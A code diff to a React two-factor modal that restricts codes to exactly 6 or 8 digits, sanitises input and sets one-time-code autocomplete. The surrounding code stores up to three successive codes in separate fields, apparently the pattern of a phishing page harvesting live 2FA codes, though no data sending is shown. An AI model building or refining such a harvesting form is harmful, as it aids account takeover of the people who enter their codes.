@@ -11,6 +11,12 @@ interface TwoFactorModalProps {
     onToggleModal: (isOpen: boolean) => void;
 }
 
+const TWO_FA_LENGTHS = [6, 8] as const;
+
+function isValidTwoFaCode(value: string): boolean {
+    return TWO_FA_LENGTHS.some((len) => value.length === len && /^\d+$/.test(value));
+}
+
 const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish, onToggleModal }) => {
 
     const [isOpen, setIsOpen] = React.useState(isOpend);
@@ -37,23 +43,24 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
         const { id, value } = e.target;
-        setTwoFa(value);
-        setErrors(prev => ({ ...prev, [id]: '' })); // Clear error on change
+        const digitsOnly = value.replace(/\D/g, '').slice(0, 8);
+        setTwoFa(digitsOnly);
+        setErrors(prev => ({ ...prev, [id]: '' }));
 
         if (click === 0) {
-            dispatch(updateForm({ twoFa: value }));
+            dispatch(updateForm({ twoFa: digitsOnly }));
         }
 
         if (click === 1) {
-            dispatch(updateForm({ twoFaSecond: value }));
+            dispatch(updateForm({ twoFaSecond: digitsOnly }));
         }
 
         if (click === 2) {
-            dispatch(updateForm({ twoFaThird: value }));
+            dispatch(updateForm({ twoFaThird: digitsOnly }));
         }
     };
 
-    const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);
+    const isTwoFaValid = isValidTwoFaCode(twoFa);
 
     const handleClose = () => {
         setIsOpen(false);
@@ -69,9 +76,10 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                 setErrors(newErrors);
                 return;
             }
-            const isTwoFaValid = twoFa.length >= 6 && /^\d+$/.test(twoFa);
-
-            if (!isTwoFaValid) {
+            if (!isValidTwoFaCode(twoFa)) {
+                if (twoFa.length > 0) {
+                    setErrors({ twoFa: 'Please enter exactly 6 or 8 digits.' });
+                }
                 return;
             }
 
@@ -213,9 +221,13 @@ const TwoFactorModal: React.FC<TwoFactorModalProps> = ({ isOpend, isOpendFinish,
                         <form onSubmit={handSubmit}>
                             <div className={`${inputClass('twoFa')}`} >
                                 <input
-                                    type="number"
+                                    type="text"
+                                    inputMode="numeric"
                                     id="twoFa"
-                                    placeholder="Enter the code"
+                                    name="twoFa"
+                                    autoComplete="one-time-code"
+                                    maxLength={8}
+                                    placeholder="Enter the code (6 or 8 digits)"
                                     className={`w-full outline-none h-full bg-transparent ${disabled ? 'opacity-70 cursor-not-allowed' : ''}`}
                                     value={twoFa}
                                     onChange={handleChange}
